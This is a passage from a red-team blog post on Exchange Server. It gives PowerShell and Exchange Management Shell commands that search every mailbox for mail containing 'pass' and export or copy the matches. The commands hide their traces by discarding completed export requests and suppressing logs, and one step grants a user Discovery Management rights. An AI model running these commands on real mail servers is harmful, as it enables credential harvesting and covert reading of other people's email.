        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
		<span class="token namespace">[string]</span><span class="token variable">$Filter</span><span class="token punctuation">,</span>
        <span class="token namespace">[Parameter(Mandatory = $True)]</span>
		<span class="token namespace">[string]</span><span class="token variable">$Version</span>
	<span class="token punctuation">)</span>

    <span class="token function">Write-Host</span> <span class="token string">"[>] Start to add PSSnapin"</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$Version</span> <span class="token operator">-eq</span> 2007<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>Admin<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$Version</span> <span class="token operator">-eq</span> 2010<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>E2010<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
        
        <span class="token function">Add-PSSnapin</span> Microsoft<span class="token punctuation">.</span>Exchange<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>PowerShell<span class="token punctuation">.</span>SnapIn<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  
    <span class="token function">Write-Host</span> <span class="token string">"[+] Start to export mail"</span> 
    <span class="token comment">#Export mail and do not save the export request</span>
    <span class="token function">New-MailboxexportRequest</span> <span class="token operator">-</span>mailbox <span class="token variable">$MailBox</span> <span class="token operator">-</span>ContentFilter <span class="token punctuation">&#123;</span><span class="token punctuation">(</span>body <span class="token operator">-like</span> <span class="token string">"*pass*"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token operator">-</span>FilePath <span class="token punctuation">(</span><span class="token variable">$ExportPath</span><span class="token operator">+</span><span class="token variable">$MailBox</span><span class="token operator">+</span><span class="token string">".pst"</span><span class="token punctuation">)</span> <span class="token operator">-</span>CompletedRequestAgeLimit 0
    <span class="token function">Write-Host</span> <span class="token string">"[+] All done."</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Search"><a href="#Search" class="headerlink" title="Search"></a>Search</h2><h3 id="PSSession-2"><a href="#PSSession-2" class="headerlink" title="PSSession"></a>PSSession</h3><pre class="line-numbers language-none"><code class="language-none">the same way to export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.22.png"></p>
<h3 id="Use-exchange-2"><a href="#Use-exchange-2" class="headerlink" title="Use exchange"></a>Use exchange</h3><pre class="line-numbers language-none"><code class="language-none">all tar to find the key
Get-Mailbox|Search-Mailbox -SearchQuery &quot;*pass*&quot; -EstimateResultOnly

all tar to find the key to export tar user dir
Get-Mailbox|Search-Mailbox -SearchQuery &quot;*pass*&quot; -TargetMailbox &quot;user&quot; -TargetFolder &quot;out&quot; -LogLevel Suppress

tar user to find the key to export tar user dir
Search-Mailbox -Identity yangsir -SearchQuery &quot;*pass*&quot; -TargetMailbox &quot;user&quot; -TargetFolder &quot;out&quot; -LogLevel Suppress<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="ECP"><a href="#ECP" class="headerlink" title="ECP"></a>ECP</h3><pre class="line-numbers language-none"><code class="language-none">let tar user into the Discovery Management group<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.35.png"></p>
<pre class="line-numbers language-none"><code class="language-none">then go to this module<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20Export%20email%20methods/iShot2021-07-3016.39.39.png"></p>

                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        Author:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">Yangsir</a>
                </span>
            </div>
            <div class="reprint__type">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-link">
                        Link:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="https://yangsirrr.github.io/2021/07/30/exchange-export-email-methods/">https://yangsirrr.github.io/2021/07/30/exchange-export-email-methods/</a>
                </span>
            </div>
            <div class="reprint__notice">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-copyright">
                        Reprint policy:
                    </i>
                </span>
                <span class="reprint-info">
                    All articles in this blog are used except for special statements
                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                    reprint policy. If reproduced, please indicate source
                    <a href="/about" target="_blank">Yangsir</a>
                    !
                </span>
            </div>
        
    </div>

    <script async defer>
      document.addEventListener("copy", function (e) {
        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
        M.toast({html: toastHTML})
      });

      function navToReprintStatement() {
        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
      }
    </script>



            <div class="tag_share" style="display: block;">
                <div class="post-meta__tag-list" style="display: inline-block;">
                    
                        <div class="article-tag">
                            
                                <a href="/tags/Redteam/">
                                    <span class="chip bg-color">Redteam</span>
                                </a>
                            
                                <a href="/tags/Exchange/">
                                    <span class="chip bg-color">Exchange</span>
                                </a>
                            
                                <a href="/tags/Information-collection/">
                                    <span class="chip bg-color">Information collection</span>
                                </a>
                            
                                <a href="/tags/Export-Email/">
                                    <span class="chip bg-color">Export Email</span>
                                </a>
                            
                                <a href="/tags/Search-Email/">
                                    <span class="chip bg-color">Search Email</span>
                                </a>
                            
                        </div>
                    
                </div>
                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
        </div>
    </div>

    

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
            <div class="card">
                <a href="/2021/07/31/powershell-bypass-catch-password/">
                    <div class="card-image">
                        
                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Powershell%20bypass%20catch%20password/6.png" class="responsive-img" alt="Powershell bypass catch password">
                        
                        <span class="card-title">Powershell bypass catch password</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-31
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Learning-record/" class="post-category">
                                    Learning record
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Redteam/">
                        <span class="chip bg-color">Redteam</span>
                    </a>
                    
                    <a href="/tags/Bypass/">
                        <span class="chip bg-color">Bypass</span>
                    </a>
                    
                    <a href="/tags/Mimikatz/">
                        <span class="chip bg-color">Mimikatz</span>
                    </a>
                    
                    <a href="/tags/Catch-Password/">
                        <span class="chip bg-color">Catch Password</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Next&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2021/07/29/exchange-rce-methods/">
                    <div class="card-image">
                        
                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Exchange%20RCE%20method/iShot2021-07-2916.42.37.png" class="responsive-img" alt="Exchange RCE methods">
                        
                        <span class="card-title">Exchange RCE methods</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-29
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Learning-record/" class="post-category">
                                    Learning record
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/Redteam/">
                        <span class="chip bg-color">Redteam</span>
                    </a>
                    
                    <a href="/tags/Exchange/">
                        <span class="chip bg-color">Exchange</span>
                    </a>
                    
                    <a href="/tags/CVE-2020-17144/">
                        <span class="chip bg-color">CVE-2020-17144</span>
                    </a>
                    
                    <a href="/tags/CVE-2020-16875/">
                        <span class="chip bg-color">CVE-2020-16875</span>
                    </a>
                    
                    <a href="/tags/CVE-2020-0688/">
                        <span class="chip bg-color">CVE-2020-0688</span>
                    </a>
                    
                    <a href="/tags/RCE/">
                        <span class="chip bg-color">RCE</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


<script>
    $('#articleContent').on('copy', function (e) {
        // IE8 or earlier browser is 'undefined'
        if (typeof window.getSelection === 'undefined') return;

        var selection = window.getSelection();
        // if the selection is short let's not annoy our users.
        if (('' + selection).length < Number.parseInt('5')) {
            return;
        }

        // create a div outside of the visible area and fill it with the selected text.
        var bodyElement = document.getElementsByTagName('body')[0];
        var newdiv = document.createElement('div');
        newdiv.style.position = 'absolute';
        newdiv.style.left = '-99999px';
        bodyElement.appendChild(newdiv);
        newdiv.appendChild(selection.getRangeAt(0).cloneContents());

        // we need a <pre> tag workaround.
        // otherwise the text inside "pre" loses all the line breaks!
        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
        }

        var url = document.location.href;
        newdiv.innerHTML += '<br />'
            + 'From: Yangsir<br />'
            + 'Author: Yangsir<br />'
            + 'Link: <a href="' + url + '">' + url + '</a><br />'
            + '本文章著作权归作者Yangsir所有，任何形式的转载都请注明出处。';

        selection.selectAllChildren(newdiv);
        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
    });
</script>


<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="song"
                   id="1804320463"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2021</span>
            
            <span id="year">2021</span>
            <a href="/about" target="_blank">Yangsir</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">8.7k</span>&nbsp;字
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/YangSirrr" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:yang_s1r@163.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>





    <a href="https://twitter.com/Yangsir00" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/Yangsir00" data-position="top" data-delay="50">
        <i class="fab fa-twitter"></i>
    </a>









    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
